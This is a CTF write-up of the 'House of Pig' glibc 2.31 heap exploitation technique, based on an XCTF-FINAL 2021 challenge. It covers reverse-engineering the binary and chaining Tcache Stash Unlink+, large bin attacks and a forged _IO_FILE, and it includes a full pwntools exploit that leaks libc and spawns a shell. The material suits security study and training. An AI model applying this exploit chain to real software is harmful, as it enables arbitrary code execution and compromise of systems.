# House of Pig

## Introduction

The House of Pig exploitation technique originates from a challenge of the same name in XCTF-FINAL 2021.

## Summary

House of Pig is an attack that combines Tcache Stash Unlink+ Attack with FSOP, while also utilizing Large Bin Attack as an auxiliary. It is mainly applicable to newer versions of libc (2.31 and later) where the program only uses calloc.

The exploitation conditions are:

* A UAF vulnerability exists
* The abort flow can be triggered, or the program explicitly calls exit, or the program can return from the main function.

The main function exploited is `_IO_str_overflow`. You can refer to [IO_FILE exploitation under glibc 2.24](https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-overflow).

The exploitation flow is:

1. Perform a Tcache Stash Unlink+ attack to write the address `__free_hook - 0x10` into tcache_pthread_struct. Since this attack requires a pointer to writable memory stored at `__free_hook - 0x8`, a large bin attack needs to be performed beforehand.
2. Perform another large bin attack to modify `_IO_list_all` to a heap address, then forge an `_IO_FILE` structure at that location.
3. Trigger `_IO_str_overflow` through the forged structure to get a shell.

Note that the large bin attack in version 2.31 differs somewhat from older versions. You can refer to the [Large Bin Attack](https://ctf-wiki.org/pwn/linux/glibc-heap/large_bin_attack/) chapter.

## Example

### XCTF-FINAL-2021 house of pig

#### Jump Table Repair

When you get the challenge binary and directly press F5, you may encounter instructions like `__asm{ jmp rax }`.

![](./figure/jmp-rax.png)

This is caused by the switch jump table structure not being recognized by IDA, resulting in a large amount of missing code. This can be repaired through IDA's Edit -> Other -> Specify switch idiom feature. For this program, the parameters to use are:

![](./figure/switch-fix.png)

After that, the switch statement can be properly recognized.

#### Flow Analysis

First, through educated guessing, we can analyze the structure of each pig:

```cpp
struct PIG
{
  char *des_ptr[24];
  int des_size[24];
  char des_exist_sign[24];
  char freed_sign[24];
};
```

And the structure pointed to by qword_9070:

```cpp
struct ALL_PIGS
{
  char *peppa_des_ptr[24];
  int peppa_des_size[24];
  char peppa_des_exist_sign[24];
  char peppa_freed_sign[24];
  int peppa_last_size;
  int align1;
  char *mummy_des_ptr[24];
  int mummy_des_size[24];
  char mummy_des_exist_sign[24];
  char mummy_freed_sign[24];
  int mummy_last_size;
  int align2;
  char *daddy_des_ptr[24];
  int daddy_des_size[24];
  char daddy_des_exist_sign[24];
  char daddy_freed_sign[24];
  int daddy_last_size;
  int view_times_left;
  int edit_times_left;
};
```

After completing these two structures, the program flow becomes much easier to analyze. The main vulnerability can be found in the role-switching operation, where the des_exist_sign[24] array is not updated during the backup and update of structures.

![](./figure/backup-operation.png)

![](./figure/copy-operation.png)

To trigger this update-missing vulnerability, a role change is required, which must pass a check_password operation.

![](./figure/checkpassword-operation.png)

This means we need to input the original value of one of three MD5 hashes. Note that the last MD5 is truncated by '\x00', so only the first two bytes need to match. You can try using brute force or other methods to pass this check. Here is one approach:

```python
def change_rol(role):
    sh.sendlineafter("Choice: ",'5')
    if (role == 1):
        sh.sendlineafter("user:\n","A\x01\x95\xc9\x1c")
    if (role == 2):
        sh.sendlineafter("user:\n","B\x01\x87\xc3\x19")
    if (role == 3):
        sh.sendlineafter("user:\n","C\x01\xf7\x3c\x32")
```

To summarize, the main vulnerability in the program is a UAF with show and edit capabilities, with 2 and 8 chances respectively. The maximum allocatable size is 0x440, which allows chunks to enter the unsorted bin and large bin. The entire program does not contain a malloc function — only calloc is used. Due to calloc's property of not retrieving chunks from tcache, and the inability to request chunks in the fastbin range, exploitation is relatively difficult.

#### Exploitation via House of Pig
```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ["tmux","splitw","-h"]

def add_message(size,payload):
    sh.sendlineafter("Choice: ",'1')
    sh.sendlineafter("size: ",str(size))
    sh.sendafter("message: ",payload)

def view_message(idx):
    sh.sendlineafter("Choice: ",'2')
    sh.sendlineafter("index: ",str(idx))

def edit_message(idx,payload):
    sh.sendlineafter("Choice: ",'3')
    sh.sendlineafter("index: ",str(idx))
    sh.sendafter("message: ",payload)

def delete_message(idx):
    sh.sendlineafter("Choice: ",'4')
    sh.sendlineafter("index: ",str(idx))

def change_rol(role):
    sh.sendlineafter("Choice: ",'5')
    if (role == 1):
        sh.sendlineafter("user:\n","A\x01\x95\xc9\x1c")
    if (role == 2):
        sh.sendlineafter("user:\n","B\x01\x87\xc3\x19")
    if (role == 3):
        sh.sendlineafter("user:\n","C\x01\xf7\x3c\x32")

sh = process("./pig")
libc = ELF("./libc-2.31.so")

change_rol(2)
for i in range(5):
    add_message(0x90,'tcache size\n' * (0x90 // 48))
    delete_message(i)
change_rol(1)
for i in range(7):
    add_message(0x150,'tcache size\n' * (0x150 // 48))
    delete_message(i)
add_message(0x150,'to unsorted\n' * (0x150 // 48)) # 7*
add_message(0x150,'to unsorted\n' * (0x150 // 48)) # 8
delete_message(7)
change_rol(2)
add_message(0xB0,'split7\n' * (0xB0 // 48)) # 5
change_rol(1)
add_message(0x150,'to unsorted\n' * (0x150 // 48)) # 9*
add_message(0x150,'to unsorted\n' * (0x150 // 48)) # 10
delete_message(9)
change_rol(2)
add_message(0xB0,'split9\n' * (0xB0 // 48)) # 6
# prepare done
change_rol(1)
add_message(0x410,'leak_libc\n' * (0x410 // 48)) # 11
add_message(0x410,'largebin\n' * (0x410 // 48)) # 12
add_message(0x410,'\n' * (0x410 // 48)) # 13
delete_message(12)

change_rol(2)
change_rol(1)
view_message(12)
sh.recvuntil("is: ")
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 96
view_message(5)
sh.recvuntil("is: ")
heap_base = u64(sh.recv(6).ljust(8,'\x00')) - 0x12750
log.success("libc_base: " + hex(libc_base))
log.success("heap_base: " + hex(heap_base))
__free_hook_addr = libc_base + libc.sym["__free_hook"]
_IO_list_all_addr = libc_base + libc.sym["_IO_list_all"]
#_IO_str_jump_addr = libc_base + libc.sym["_IO_str_jump"]
_IO_str_jump_addr = libc_base + 0x1ED560
system_addr = libc_base + libc.sym["system"]
############################### leak done ###############################
add_message(0x410,'get back\n' * (0x410 // 48)) # 14
change_rol(2)
add_message(0x420,'largebin\n' * (0x420 // 48)) # 7
add_message(0x430,'largebin\n' * (0x430 // 48)) # 8
delete_message(7)
add_message(0x430,'push\n' * (0x430 // 48)) # 9
change_rol(1)
change_rol(2)
edit_message(7,(p64(0) + p64(__free_hook_addr - 0x28)) * (0x420//48))

change_rol(1)
delete_message(14)
add_message(0x430,'push\n' * (0x430 // 48)) # 15
# largebin attack done

change_rol(3)
add_message(0x410,'get_back\n' * (0x430 // 48)) # 0

change_rol(1)
edit_message(9,(p64(heap_base + 0x12C20) + \
                p64(__free_hook_addr - 0x20)) * (0x150 // 48))
change_rol(3) 
add_message(0x90,'do stash\n' * (0x90 // 48)) # 1
# stash unlink done
change_rol(2)
edit_message(7,(p64(0) + p64(_IO_list_all_addr - 0x20)) * (0x420//48))
change_rol(3)
delete_message(0)
add_message(0x430,'push\n' * (0x430 // 48)) # 2
# second largebin atk
change_rol(3)
add_message(0x330,'pass\n' * (0x430 // 48)) # 3
add_message(0x430,'pass\n' * (0x430 // 48)) # 4

fake_IO_FILE = ''
fake_IO_FILE += 2 * p64(0)
fake_IO_FILE += p64(1) # _IO_write_base
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(heap_base + 0x13E20) # old_buf, _IO_buf_base
fake_IO_FILE += p64(heap_base + 0x13E20 + 0x18) # calc the memcpy length, _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0xC0 - 0x10,'\x00')
fake_IO_FILE += p32(0) # mode <= 0
fake_IO_FILE += p32(0) + p64(0) * 2 # bypass _unused2
fake_IO_FILE += p64(_IO_str_jump_addr)
payload = fake_IO_FILE + '/bin/sh\x00' + 2 * p64(system_addr)
sh.sendlineafter("01dwang's Gift:\n",payload)
#add_message(0x410,'large_bin\n' * (0x410 // 48)) # 1
sh.sendlineafter("Choice: ",'5')
sh.sendlineafter("user:\n",'')

sh.interactive()
```

## References
> [House of Pig: A New Heap Exploitation Technique Explained in Detail](https://www.anquanke.com/post/id/242640#h2-3)
